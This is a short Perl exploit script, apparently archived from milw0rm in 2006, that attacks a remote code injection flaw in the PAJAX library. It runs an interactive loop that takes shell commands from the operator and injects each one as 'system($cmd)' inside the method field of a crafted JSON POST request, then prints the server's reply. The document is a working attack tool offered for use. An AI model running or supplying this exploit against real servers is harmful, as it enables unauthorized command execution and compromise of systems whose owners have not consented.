#!/usr/bin/perl

use IO::Socket;

print "PAJAX Remote Code Injection - code by: Stoney - exploit found
by: RedTeam\n";

if ($ARGV[0] && $ARGV[1])
{
 $host = $ARGV[0];
 $path = $ARGV[1];
 $sock = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$host",
PeerPort => "80") || die "connecterror\n";
 while (1) {
   print '['.$host.']# ';
   $cmd = <STDIN>;
   chop($cmd);
   last if ($cmd eq 'exit');
   $ajaxdata = "{\"id\": \"bb2238f1186dad8d6370d2bab5f290f71\", \"className\": \"Calculator\", \"method\": \"add(1,1);system($cmd);\$obj->add\", \"params\": [\"1\", \"5\"]}";

   print $sock "POST ".$path." HTTP/1.1\n";
   print $sock "Host: ".$host."\n";
   print $sock "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
   print $sock "Content-Type: text/json\n";
   print $sock "Content-Length:".length($ajaxdata)."\n\n".$ajaxdata;
   while ($ans = <$sock>)
      {
       print "$ans";
      }
  }
 }
else {
 print "Usage: perl ajax.pl [host] [path_to_ajax]\n\n";
exit;
}

# milw0rm.com [2006-04-13]